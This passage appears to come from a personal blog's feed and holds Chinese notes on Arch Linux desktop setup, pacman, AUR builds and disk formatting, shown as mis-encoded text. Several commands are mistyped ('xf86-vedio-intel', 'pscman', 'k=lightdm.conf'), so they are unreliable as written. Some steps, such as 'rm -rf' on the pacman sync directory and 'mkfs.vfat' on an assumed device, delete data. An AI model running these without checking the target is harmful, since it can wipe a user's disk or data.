title="æ¡Œé¢ç¯å¢ƒä¸çª—å£ç®¡ç†å™¨æ¦‚è¿°"></a>æ¡Œé¢ç¯å¢ƒä¸çª—å£ç®¡ç†å™¨æ¦‚è¿°</h4><p>æ¡Œé¢ç¯å¢ƒä¼šæä¾›å¾ˆå¤šå·¥å…·ã€‚å¤§å¤šæ•°æ¡Œé¢ç¯å¢ƒåŒ…æ‹¬ä¸€æ•´å¥—æ•´åˆåº”ç”¨ç¨‹åºå’Œä½¿ç”¨å·¥.</p><p>çª—å£ç®¡ç†å™¨ä»…ä»…ç”¨äºç®¡ç†çª—å£ï¼Œå®‰è£…äº†çª—å£ç®¡ç†å™¨ä¹‹åå°±å¯ä»¥ä¸ç”¨å®‰è£…æ¡Œé¢ç¯å¢ƒ.</p><h4 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h4><p>æœ‰äº›å¯èƒ½åœ¨å‰é¢ä»¥ç»å®‰è£…å¥½äº†:</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pacman -S acpi usbutils pciutils</span><br></code></pre></td></tr></table></figure><ul><li><p><code>acpi</code> æ˜¯ç”¨æ¥æŸ¥çœ‹ç”µæ± ç”µé‡çš„å·¥å…·ã€‚</p></li><li><p><code>usbutils</code> æ˜¯ç”¨æ¥æŸ¥çœ‹ç³»ç»Ÿ USB è®¾å¤‡.</p></li><li><p><code>pciutils</code> ç”¨æ¥æŸ¥çœ‹ç³»ç»Ÿ PCI è®¾å¤‡ã€‚</p></li></ul><p>å®‰è£…é©±åŠ¨:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">pacman -S xf86-vedio-<span class="hljs-built_in">int</span>el mesa xf86-input-libinput<br></code></pre></td></tr></table></figure><p>è¿™ä¸‰ä¸ªå¥½åƒæœ¬å°±å®‰è£…å¥½äº†çš„ï¼Œå› ä¸ºæˆ‘åœ¨ä¸‹è½½çš„æ—¶å€™æ˜¾ç¤ºçš„æ˜¯ <code>reinstall</code>.</p><ul><li><p><code>xf86-vedio-intel</code> æ˜¯æ˜¾æ ¸çš„é©±åŠ¨.</p></li><li><p><code>mesa</code> æ˜¯ç”¨æ¥é…åˆæ˜¾å¡çš„å¦ä¸€ç§ä¸Šå±‚é©±åŠ¨.</p></li><li><p><code>xf86-input-libinput</code> æ˜¯ç¬”è®°æœ¬è§¦æ‘¸æ¿çš„é©±åŠ¨.</p></li></ul><p>å®‰è£…Xçª—å£ç³»ç»Ÿçš„ç›¸å…³æœåŠ¡:</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pacman -S <span class="hljs-keyword">xorg </span><span class="hljs-keyword">xorg-xinit </span><span class="hljs-keyword">xorg-server </span>xwallpaper picom<br></code></pre></td></tr></table></figure><ul><li><code>xorg</code> æ˜¯ X æœåŠ¡ï¼Œç”¨æ¥æ˜¾ç¤ºå›¾å½¢ç•Œé¢</li><li><code>xorg-xinit</code> æ˜¯ X æœåŠ¡çš„å¯åŠ¨ç¨‹åº</li><li><code>xwallpaper</code> ç”¨äºæ›´æ¢å£çº¸</li><li><code>picom</code> çª—å£æ¸²æŸ“ï¼Œåé¢åšåŠé€æ˜æ¸²æŸ“</li></ul><h4 id="å®‰è£…çª—å£ç®¡ç†å™¨"><a href="#å®‰è£…çª—å£ç®¡ç†å™¨" class="headerlink" title="å®‰è£…çª—å£ç®¡ç†å™¨"></a>å®‰è£…çª—å£ç®¡ç†å™¨</h4><p>å®‰è£… suckless å…¨å®¶æ¡¶:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://git.suckless.org/dwm --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span> <br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://git.suckless.org/st --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span> <br>git <span class="hljs-keyword">clone</span> <span class="hljs-title">https</span>://git.suckless.org/dmenu --<span class="hljs-attr">depth=</span><span class="hljs-number">1</span> <br></code></pre></td></tr></table></figure><p>åˆ†åˆ«è¿›å…¥è¿™å‡ ä¸ªä¸‹è½½ä¸‹æ¥çš„ç›®å½•ï¼Œå¹¶æ‰§è¡Œ <code>sudo make clean install</code>.</p><p>åœ¨å®¶ç›®å½•ä¸‹åˆ›å»º <code>.xinitrc</code> æ–‡ä»¶å¹¶æ·»åŠ  <code>exec dwm</code>.</p><h4 id="å®‰è£…äº®åº¦æ§åˆ¶å’Œ-Night-Mode"><a href="#å®‰è£…äº®åº¦æ§åˆ¶å’Œ-Night-Mode" class="headerlink" title="å®‰è£…äº®åº¦æ§åˆ¶å’Œ Night Mode"></a>å®‰è£…äº®åº¦æ§åˆ¶å’Œ Night Mode</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo pacman -S brightnessctl redshift</span><br></code></pre></td></tr></table></figure><p>åœ¨ <code>.xinitrc</code> æ–‡ä»¶ä¸­æ·»åŠ  <code>brightnessctl set 20% &amp;</code> å’Œ <code>redshift -P -O 4800 &amp;</code></p><p>åŒæ ·åœ¨ <code>.xinitrc</code> ä¸­æ·»åŠ  <code>picom &amp;</code></p><h3 id="å®‰è£…-lightdm-æœåŠ¡"><a href="#å®‰è£…-lightdm-æœåŠ¡" class="headerlink" title="å®‰è£… lightdm æœåŠ¡"></a>å®‰è£… lightdm æœåŠ¡</h3><p><code>lightdm</code> æ˜¯ä¸€ä¸ª display managerï¼Œä¹Ÿå°±æ˜¯æä¾›ä¸€ä¸ªç™»å½•ç•Œé¢.</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo pacman -S lightdm lightdm-webkit2-greeter lightdm-webkit-theme-litarvan<br></code></pre></td></tr></table></figure><p>å…¶é…ç½®æ–‡ä»¶ä½ç½®ä¸º <code>/etc/lightdm/lightdm.conf</code> ä¿®æ”¹è¯¥é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹ <code>greeter-session</code> çš„ä¸º <code>greeter-session=lightdm-webkit2-greeter</code>.</p><p>æ¥ç€ä¿®æ”¹ <code>/etc/lightdm/lightdm-webkit2-greeter.conf</code> å°† <code>detect_theme_errors</code> çš„å€¼æ”¹ä¸º <code>false</code>. <code>webkit_theme</code> çš„å€¼æ”¹ä¸º <code>litarvan</code>.</p><h3 id="å®‰è£…-kde-æ¡Œé¢ç¯å¢ƒ"><a href="#å®‰è£…-kde-æ¡Œé¢ç¯å¢ƒ" class="headerlink" title="å®‰è£… kde æ¡Œé¢ç¯å¢ƒ"></a>å®‰è£… kde æ¡Œé¢ç¯å¢ƒ</h3><p>å…ˆå®‰è£…ä¾èµ–çš„ xorg åŒ….</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">sudo pacman -S <span class="hljs-keyword">xorg </span><span class="hljs-keyword">xorg-server </span><span class="hljs-keyword">xorg-xinit</span><br></code></pre></td></tr></table></figure><p>æœ€å°å®‰è£… kde å’Œ plasma æ¡Œé¢:</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">sudo pacman -S plasma-<span class="hljs-keyword">meta</span> sddm<br></code></pre></td></tr></table></figure><p>ä¹‹å‰è£…çš„ <code>kde-applications-meta</code> é‡Œé¢æ˜¯åº”ç”¨ï¼Œä¸æ˜¯æ¡Œé¢ç¯å¢ƒ. è¯¦æƒ…è§<a href="https://wiki.archlinux.org/title/KDE">ArchWiki</a></p><p>sddm æ˜¯ kde ä½¿ç”¨çš„ç™»å½•ç®¡ç†å™¨.</p><p>è®¾ç½® sddm çš„å¼€æœºå¯åŠ¨:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo systemctl <span class="hljs-built_in">enable</span> sddm<br></code></pre></td></tr></table></figure><p>ä¸‹è½½ä¸€äº›åº”ç”¨:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nginx">  <span class="hljs-attribute">sudo</span> pacman -S konsole alacritty dolphin ark gwenview lolcat sl neofetch<br><span class="hljs-comment"># konsole å’Œ alacritty éƒ½æ˜¯ç»ˆç«¯</span><br><span class="hljs-comment"># dolphin æ˜¯æ–‡ä»¶ç®¡ç†å™¨</span><br><span class="hljs-comment"># ark æ˜¯å½’æ¡£ç®¡ç†å™¨ï¼Œå°±æ˜¯è§£å‹ç¼©çš„</span><br><span class="hljs-comment"># gwenview æ˜¯çœ‹å›¾ç‰‡çš„</span><br><span class="hljs-comment"># lolcat neofetch å’Œ sl æ˜¯é˜²æ­¢ä½ æ‰“å¼€ç»ˆç«¯æ²¡äº‹å¹²</span><br></code></pre></td></tr></table></figure><h3 id="å›½å†…å¼€å‘çš„æ¡Œé¢ç¯å¢ƒæœ‰-deepin"><a href="#å›½å†…å¼€å‘çš„æ¡Œé¢ç¯å¢ƒæœ‰-deepin" class="headerlink" title="å›½å†…å¼€å‘çš„æ¡Œé¢ç¯å¢ƒæœ‰ deepin"></a>å›½å†…å¼€å‘çš„æ¡Œé¢ç¯å¢ƒæœ‰ deepin</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">pscman -S deepin deepin-extra</span><br></code></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªå·²ç»é…ç½®å¥½çš„çš®è‚¤ï¼Œé™„å¸¦å¾ˆå¤šè½¯ä»¶.</p><p>å°† <code>/etc/lightdm/k=lightdm.conf</code> ä¸­ <code>greeter-session</code> æ”¹ä¸º:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">greeter-session</span><span class="hljs-operator">=</span>lightdm-deepin-greeter<br></code></pre></td></tr></table></figure><h3 id="TLP"><a href="#TLP" class="headerlink" title="TLP"></a>TLP</h3><p>ç”¨äºç®¡ç†ç”µæ± .</p><h3 id="å­—ä½“"><a href="#å­—ä½“" class="headerlink" title="å­—ä½“"></a>å­—ä½“</h3><p>è¿›å…¥ä¸€ä¸ª b ç«™ up çš„ github é¡µé¢â€“ <a href="https://github.com/theniceboy">ä¸»é¡µ</a></p><h3 id="ç½‘æ˜“äº‘"><a href="#ç½‘æ˜“äº‘" class="headerlink" title="ç½‘æ˜“äº‘"></a>ç½‘æ˜“äº‘</h3><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">yay -S netease-cloud-music</span><br></code></pre></td></tr></table></figure><h3 id="ç™¾åº¦ç½‘ç›˜"><a href="#ç™¾åº¦ç½‘ç›˜" class="headerlink" title="ç™¾åº¦ç½‘ç›˜"></a>ç™¾åº¦ç½‘ç›˜</h3>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ pacman éƒ¨åˆ†</title>
    <link href="/2022/08/30/ArchWiki-%E4%B8%AD-pacman-%E9%83%A8%E5%88%86/"/>
    <url>/2022/08/30/ArchWiki-%E4%B8%AD-pacman-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Pacman">ArchWiki</a></p><p>pacman çš„ç›®æ ‡æ˜¯ç®€åŒ–å¯¹è½¯ä»¶åŒ…çš„ç®¡ç†ã€‚</p><p>pacman ç”¨ C è¯­è¨€ç¼–å†™ï¼Œå¹¶ä½¿ç”¨ tar ä½œä¸ºæ‰“åŒ…æ ¼å¼.</p><p>ä¼¼ä¹æ˜¯ï¼Œå®˜æ–¹çš„è½¯ä»¶ä»“åº“çš„å†…å®¹å¯ç›´æ¥ç”¨ pacman ä¸‹è½½.</p><p>è¿è¡Œ <code>pacman -Ql pacman | grep -E &#39;bin/.+&#39;</code> å¯æŸ¥çœ‹å®Œæ•´çš„å·¥å…·åˆ—è¡¨ã€‚</p><p><code>pacman-contrib</code> è½¯ä»¶åŒ…åŒ…å«ä¸€äº›æœ‰ç”¨çš„å·¥å…·ã€‚</p><p><a href="https://wiki.archlinux.org/title/Pacman/Rosetta">pacman å’Œå…¶ä»–åŒ…ç®¡ç†å™¨å¯¹æ¯”</a></p><p>åœ¨ Arch ä¸Šå®‰è£…è½¯ä»¶åŒ…æ—¶ï¼Œé¿å…åœ¨è¿˜æ²¡æœ‰æ›´æ–°ç³»ç»Ÿå‰åˆ·æ–°åŒæ­¥è½¯ä»¶åŒ…åˆ—è¡¨.</p><p>æ›´æ–°è½¯ä»¶åŒ…:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>pacman -Syy<br></code></pre></td></tr></table></figure><h1 id="pacman-é…ç½®"><a href="#pacman-é…ç½®" class="headerlink" title="pacman é…ç½®"></a>pacman é…ç½®</h1><p>é…ç½®æ–‡ä»¶åœ¨ <code>/etc/pacman.conf</code>.</p><p>åœ¨æœ«å°¾æ·»åŠ çš„:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Include</span> = <span class="hljs-regexp">/etc/</span>pacman.d/archlinux<br></code></pre></td></tr></table></figure><p>è¿™ä¸ª <code>Include</code> å°±æ˜¯å¼•å…¥åé¢è¿™ä¸ªæ–‡ä»¶.</p><h1 id="å„ç§æŒ‡ä»¤å’Œå°æŠ€å·§"><a href="#å„ç§æŒ‡ä»¤å’Œå°æŠ€å·§" class="headerlink" title="å„ç§æŒ‡ä»¤å’Œå°æŠ€å·§"></a>å„ç§æŒ‡ä»¤å’Œå°æŠ€å·§</h1><p>ä¸»è¦åˆ†ä¸ºä¸‰å¤§ç±»:</p><ul><li><code>-S</code>, Synchronize, å®‰è£…</li><li><code>-R</code>, Remove, åˆ é™¤</li><li><code>-Q</code>, Query, æŸ¥è¯¢æœ¬åœ°çš„è½¯ä»¶</li></ul><p>ä¸€èˆ¬åé¢éƒ½è¦è·Ÿ 1~2 ä¸ªå°å†™å­—æ¯.</p><h2 id="å’Œ-S-ç›¸å…³"><a href="#å’Œ-S-ç›¸å…³" class="headerlink" title="å’Œ -S ç›¸å…³"></a>å’Œ <code>-S</code> ç›¸å…³</h2><p><code>sudo pacman -Sy</code> è¿™ä¸ªæ˜¯è·å–æœ€æ–°çš„è½¯ä»¶ä¿¡æ¯.</p><p><code>sudo pacman -Syy</code> è¿™ä¸ªæ˜¯å¼ºåˆ¶æ›´æ–°è½¯ä»¶åº“.</p><p>ä½†ä»¥ä¸Šä¸¤ä¸ªä¸ä¼šå®é™…æ›´æ–°ä½ çš„è½¯ä»¶.</p><p><code>sudo pacman -Su</code> è¿™ä¸ª <code>u</code> æ˜¯ update.</p><p><code>sudo pacman -Syu</code> å°±ä¼šåˆ·æ–°è½¯ä»¶åº“å¹¶æ›´æ–°è½¯ä»¶.</p><p><code>sudo pacman -Ss</code> è¿™ä¸ª <code>s</code> å°±æ˜¯ search. ç”¨æ¥æŸ¥è¯¢</p><p>pacman åœ¨ä¸‹åœ¨å®Œä¸€ä¸ªè½¯ä»¶åŒ…ä¹‹å, ä¼šå°†å®‰è£…åŒ…ç•™åœ¨æœ¬åœ°, <code>sudo pacman -Sc</code> ä¼šåˆ é™¤ç¼“å­˜.</p><h2 id="å’Œ-R-ç›¸å…³"><a href="#å’Œ-R-ç›¸å…³" class="headerlink" title="å’Œ -R ç›¸å…³"></a>å’Œ <code>-R</code> ç›¸å…³</h2><p><code>sudo pacman -R +è½¯ä»¶å</code> è¿™æ¡å‘½ä»¤ä¸ä¼šåˆ é™¤ç›¸å…³ä¾èµ–.</p><p><code>sudo pacman -Rs +è½¯ä»¶å</code> è¿™æ¡å‘½ä»¤ä¼šåˆ é™¤ç›¸å…³ä¾èµ–.</p><p><code>sudo pacman -Rns +è½¯ä»¶å</code> ä¼šåˆ é™¤å…¨å±€çš„é…ç½®æ–‡ä»¶, ä½†ä½  local çš„å¦‚ .vimrc ä¸ä¼šè¢«åˆ é™¤. </p><h2 id="å’Œ-Q-ç›¸å…³"><a href="#å’Œ-Q-ç›¸å…³" class="headerlink" title="å’Œ -Q ç›¸å…³"></a>å’Œ <code>-Q</code> ç›¸å…³</h2><p><code>sudo pacman -Q | wc -l</code> å¯ä»¥æŸ¥çœ‹ä½ å·²ç»å®‰è£…äº†æœ‰å¤šå°‘ä¸ªè½¯ä»¶.</p><p><code>sudo pacman -Qe</code> å¯ä»¥æŸ¥çœ‹ä½ è‡ªå·±å®‰è£…çš„è½¯ä»¶, é™¤å»ç³»ç»Ÿå®‰è£…çš„.</p><p><code>sudo pacman -Qeq</code> ä¸ä¼šæ˜¾ç¤ºç‰ˆæœ¬å·.</p><p><code>sudo pacman -Qs +è½¯ä»¶å</code> </p><p><code>sudo pacman -Qdt</code>, è¿™é‡Œ <code>dt</code> æ˜¯ dependencies, æ˜¾ç¤ºä¸å†è¢«éœ€è¦çš„ä¾èµ–.</p><p>åˆ é™¤è¿™äº› <code>sudo pacman -R $(sudo pacman -Qdt)</code></p><h1 id="error-GPGME-error-No-data-è§£å†³"><a href="#error-GPGME-error-No-data-è§£å†³" class="headerlink" title="error: GPGME error: No data è§£å†³"></a>error: GPGME error: No data è§£å†³</h1><p><a href="https://www.fujieace.com/blackarch-linux/gpgme.html">å‚è€ƒ</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo rm -rf <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/pacman/</span>sync<br>$ sudo pacman -Syu<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki ä¸­ AUR éƒ¨åˆ†</title>
    <link href="/2022/08/30/ArchWiki-%E4%B8%AD-AUR-%E9%83%A8%E5%88%86/"/>
    <url>/2022/08/30/ArchWiki-%E4%B8%AD-AUR-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Arch_User_Repository_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">ArchLinux</a></p><h1 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h1><p>AUR (Arch User Repository), å…¶è½¯ä»¶åŒ…ä»¥ <code>PKGBUILD</code> çš„å½¢å¼æä¾›ï¼Œç”¨æˆ·è‡ªå·±é€šè¿‡ <code>makepkg</code> ç”ŸæˆåŒ…ï¼Œå†ç”± <code>pacman</code> å®‰è£…ã€‚</p><p>åˆ›å»º AUR çš„åˆè¡·æ˜¯æ–¹ä¾¿ç”¨æˆ·ç»´æŠ¤å’Œåˆ†äº«æ–°è½¯ä»¶åŒ….</p><p>å¯é€šè¿‡ SSH è¿æ¥åˆ° AUR: è¿è¡Œ <code>ssh aur@aur.archlinux.org help</code> å¯è·å¾—å¯ç”¨æŒ‡ä»¤åˆ—è¡¨ã€‚</p><p>AUR ç»´æŠ¤äººå‘˜ç°åœ¨ä»è¢«ç§°ä¸ºå—ä¿¡ç”¨æˆ· (TU).</p><p>Git ä»“åº“æˆä¸º PKGBUILD çš„å‘å¸ƒæ–¹å¼.</p><p>Github ä¸Šçš„ AUR Archive å‚¨å­˜äº†è¿ç§»è¿‡ç¨‹ä¸­çš„æ‰€æœ‰ AUR3 è½¯ä»¶åŒ…ä»“åº“ã€‚<br><a href="https://github.com/aur-archive">AUR Archive</a></p><h1 id="å®‰è£…ä¸æ›´æ–°è½¯ä»¶åŒ…"><a href="#å®‰è£…ä¸æ›´æ–°è½¯ä»¶åŒ…" class="headerlink" title="å®‰è£…ä¸æ›´æ–°è½¯ä»¶åŒ…"></a>å®‰è£…ä¸æ›´æ–°è½¯ä»¶åŒ…</h1><p>åŸºæœ¬æ­¥éª¤:</p><ol><li>ä» AUR ä¸‹è½½åŒ…å« PKGBUILD å’Œå…¶ä»–å®‰è£…æ–‡ä»¶çš„ tar åŒ…</li><li>ç”¨ <code>tar -xvf packagename.tar.gz</code> è§£åŒ…åˆ°ä¸€ä¸ªä»…ç”¨äºç¼–è¯‘ AUR çš„ç©ºé—²æ–‡ä»¶å¤¹</li><li>éªŒè¯ PKGBUILD å’Œå…¶ä»–ç›¸å…³æ–‡ä»¶ï¼Œç¡®ä¿å…¶ä¸­ä¸å«æœ‰æ¶æ„ä»£ç </li><li>åœ¨ä¿å­˜æ–‡ä»¶çš„ç›®å½•ä¸‹è¿è¡Œ <code>makepkg</code>, è¿™å°†ä¸‹è½½ä»£ç ï¼Œç¼–è¯‘å¹¶æ‰“åŒ…</li><li>è¿è¡Œ <code>pacman -U package_file</code> å°†è½¯ä»¶åŒ…å®‰è£…åˆ°ç³»ç»Ÿä¸Š</li></ol><h1 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h1><p>éœ€å®‰è£… <code>base-devel</code> è½¯ä»¶åŒ…ç»„ï¼Œå…¶åŒ…å«äº† <code>make</code> å’Œå…¶ä»–ç¼–è¯‘å·¥å…·ã€‚</p><h1 id="è·å–è½¯ä»¶åŒ…æ„å»ºæ‰€éœ€çš„æ–‡ä»¶"><a href="#è·å–è½¯ä»¶åŒ…æ„å»ºæ‰€éœ€çš„æ–‡ä»¶" class="headerlink" title="è·å–è½¯ä»¶åŒ…æ„å»ºæ‰€éœ€çš„æ–‡ä»¶"></a>è·å–è½¯ä»¶åŒ…æ„å»ºæ‰€éœ€çš„æ–‡ä»¶</h1><p>ä½¿ç”¨ git:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span></span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ curl:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl -L -O https:<span class="hljs-regexp">//</span>aur.archlinux.org<span class="hljs-regexp">/cgit/</span>aur.git<span class="hljs-regexp">/snapshot/</span>package_name.tar.gz<br></code></pre></td></tr></table></figure><p>ä¸ç”¨ root ç”¨æˆ·è¿è¡Œ <code>makepkg</code> èƒ½å¤Ÿåœ¨ä¸€å®šç¨‹åº¦ä¸Šé˜²æ­¢æ¶æ„ä»£ç æŸåç³»ç»Ÿã€‚</p><p>å¯ä»¥ä½¿ç”¨ <code>git clean -dfX</code> åˆ é™¤æ‰€æœ‰è¢« git å¿½ç•¥çš„æ–‡ä»¶ï¼Œä»è€Œåˆ é™¤æ‰€æœ‰ä»¥å‰æ„å»ºçš„åŒ…æ–‡ä»¶ã€‚</p><p><code>makepkg</code> å¸¸ç”¨å‚æ•°:</p><ul><li><code>-s/--syncdeps</code> åœ¨æ„å»ºä¹‹å‰ä½¿ç”¨ pacman è‡ªåŠ¨è§£æå’Œå®‰è£…ä»»ä½•ä¾èµ–é¡¹ã€‚å¦‚æœåŒ…ä¾èµ–äºå…¶ä»– AUR åŒ…ï¼Œåˆ™æ‚¨åº”å…ˆæ‰‹åŠ¨å®‰è£…å®ƒä»¬ã€‚</li><li><code>-i/--install</code> å®‰è£…æˆåŠŸçš„åŒ…ã€‚è¿™ä½¿æ‚¨å¯ä»¥è·³è¿‡é€šå¸¸æ‰‹åŠ¨å®Œæˆçš„ä¸‹ä¸€æ­¥ã€‚</li><li><code>-r/--rmdeps</code> åœ¨æ„å»ºååˆ é™¤æ„å»ºæ—¶ä¾èµ–é¡¹ï¼Œå› ä¸ºå®ƒä»¬ä¸å†éœ€è¦ã€‚ä½†æ˜¯ï¼Œä¸‹æ¬¡æ›´æ–°åŒ…æ—¶å¯èƒ½éœ€è¦é‡æ–°å®‰è£…è¿™äº›ä¾èµ–é¡¹ã€‚</li><li><code>-c/--clean</code> åœ¨æ„å»ºåæ¸…ç†ä¸´æ—¶æ„å»ºæ–‡ä»¶ï¼Œå› ä¸ºå®ƒä»¬ä¸å†éœ€è¦ã€‚è¿™äº›æ–‡ä»¶é€šå¸¸ä»…åœ¨è°ƒè¯•æ„å»ºè¿‡ç¨‹æ—¶æ‰éœ€è¦ã€‚</li></ul><h1 id="å®‰è£…åŒ…"><a href="#å®‰è£…åŒ…" class="headerlink" title="å®‰è£…åŒ…"></a>å®‰è£…åŒ…</h1><p>ä½¿ç”¨ <code>pacman</code>:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># pacman -U package_name-version-architecture.pkg.tar.zst</span><br></code></pre></td></tr></table></figure><h1 id="å‡çº§åŒ…"><a href="#å‡çº§åŒ…" class="headerlink" title="å‡çº§åŒ…"></a>å‡çº§åŒ…</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git pull<br></code></pre></td></tr></table></figure><h1 id="è°ƒè¯•åŒ…æ„å»ºè¿‡ç¨‹"><a href="#è°ƒè¯•åŒ…æ„å»ºè¿‡ç¨‹" class="headerlink" title="è°ƒè¯•åŒ…æ„å»ºè¿‡ç¨‹"></a>è°ƒè¯•åŒ…æ„å»ºè¿‡ç¨‹</h1><ol><li>åœ¨æ„å»ºä¹‹å‰ï¼Œç¡®ä¿ç¯å¢ƒæœ€æ–°</li><li>ç¡®ä¿å®‰è£… <code>base-devle</code></li><li>ä½¿ç”¨ <code>-s</code> é€‰é¡¹å’Œ <code>makepkg</code> é…ç½®</li></ol>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³ç”¨ U ç›˜ä½œä¸ºå¯åŠ¨ç›˜æ—¶æ²¡æ‰¾åˆ° Linux çš„å®‰è£…é€‰é¡¹</title>
    <link href="/2022/08/30/%E8%A7%A3%E5%86%B3%E7%94%A8-U-%E7%9B%98%E4%BD%9C%E4%B8%BA%E5%90%AF%E5%8A%A8%E7%9B%98%E6%97%B6%E6%B2%A1%E6%89%BE%E5%88%B0-Linux-%E7%9A%84%E5%AE%89%E8%A3%85%E9%80%89%E9%A1%B9/"/>
    <url>/2022/08/30/%E8%A7%A3%E5%86%B3%E7%94%A8-U-%E7%9B%98%E4%BD%9C%E4%B8%BA%E5%90%AF%E5%8A%A8%E7%9B%98%E6%97%B6%E6%B2%A1%E6%89%BE%E5%88%B0-Linux-%E7%9A%84%E5%AE%89%E8%A3%85%E9%80%89%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<p>grub ä¸æ”¯æŒç”¨ ntfs æ ¼å¼çš„å¯åŠ¨ç›˜ï¼Œéœ€è¦å°†å…¶æ”¹ä¸º ext4&#x2F;fat32, è¿™é‡Œä½¿ç”¨ fat32 æ ¼å¼å³å¯:</p><p>å…ˆç”¨ <code>fdisk</code> æŸ¥æ‰¾è®¾å¤‡:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo fdisk -l<br></code></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹æ ¼å¼, å‡è®¾è®¾å¤‡ä¸º <code>/dev/sda1</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo mkfs.vfat <span class="hljs-regexp">/dev/</span>sda1<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>è§£å†³åœ¨ hexo åšå®¢ä¸­æ— æ³•æ˜¾ç¤ºå›¾ç‰‡é—®é¢˜</title>
    <link href="/2022/08/30/%E8%A7%A3%E5%86%B3%E5%9C%A8-hexo-%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/30/%E8%A7%A3%E5%86%B3%E5%9C%A8-hexo-%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98/</url>
    
